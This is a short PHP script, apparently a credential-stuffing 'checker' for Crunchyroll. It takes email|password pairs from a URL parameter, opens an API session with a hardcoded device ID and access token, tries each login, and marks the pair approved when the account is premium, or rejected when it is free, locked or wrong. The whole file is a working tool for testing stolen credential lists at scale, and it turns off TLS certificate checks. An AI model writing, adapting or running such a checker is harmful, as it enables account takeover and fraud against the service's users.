<?php
clear();
error_reporting(0);

$linhas = $_GET['linhas'];
$separar = explode("|", $linhas);
$email = $separar[0];
$senha = $separar[1];

function extrair($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function clear(){
  if(file_exists('cookies.txt')){
    @unlink('cookies.txt');
  }
}

$ch = curl_init();
curl_setopt_array($ch, array(
  CURLOPT_URL => 'https://api.crunchyroll.com/start_session.0.json',
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_FOLLOWLOCATION => 1,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_SSL_VERIFYHOST => 0,
  CURLOPT_HTTPHEADER => array(
    'User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)',
    'Host: api.crunchyroll.com',
    'Contant-type: application/x-www-form-urlencoded'
  ),
  CURLOPT_COOKIEJAR => getcwd().'/cookies.txt',
  CURLOPT_COOKIEFILE => getcwd().'/cookies.txt',
  CURLOPT_POSTFIELDS => 'locale=enUS&device_id=ffffffff-8890-a339-c4c1-03907679fb22&device_type=com.crunchyroll.crunchyroid&access_token=Scwg9PRRZ19iVwD&version=439',
  CURLOPT_CUSTOMREQUEST => 'POST'
));
$gettoken = curl_exec($ch);

if(strpos($gettoken, 'Please enable cookies.') !== false){
  echo "#Reprovada $linhas | IP BLOCK.";
}

$token = extrair($gettoken, 'session_id":"', '","country_code');

$ch = curl_init();
curl_setopt_array($ch, array(
  CURLOPT_URL => 'https://api.crunchyroll.com/login.0.json',
  CURLOPT_RETURNTRANSFER => 1,
  CURLOPT_FOLLOWLOCATION => 1,
  CURLOPT_SSL_VERIFYPEER => 0,
  CURLOPT_SSL_VERIFYHOST => 0,
  CURLOPT_HTTPHEADER => array(
    'User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)',
    'Contant-type: application/x-www-form-urlencoded'
  ),
  CURLOPT_COOKIEJAR => getcwd().'/cookies.txt',
  CURLOPT_COOKIEFILE => getcwd().'/cookies.txt',
  CURLOPT_POSTFIELDS => 'account='.$email.'&password='.$senha.'&locale=enUS&session_id='.$token.'',
  CURLOPT_CUSTOMREQUEST => 'POST'
));
$login = curl_exec($ch);

if(strpos($login, 'Incorrect login information.') !== false){
  echo "#Reprovada $linhas | SENHA OU EMAIL INCORRETO.";
}elseif (strpos($login, 'Your account has been locked.') !== false) {
  echo "#Reprovada $linhas | CONTA BLOQUEADA.";
}elseif (strpos($login, '"premium":""') !== false) {
  echo "#Reprovada $linhas | CONTA FREE.";
}elseif (strpos($login, 'user","user_id') !== false) {
  echo "#Aprovada $linhas | Status: Premium";
}else{
  echo "#Reprovada $linhas | ERROR.";
}

curl_close($ch);
?>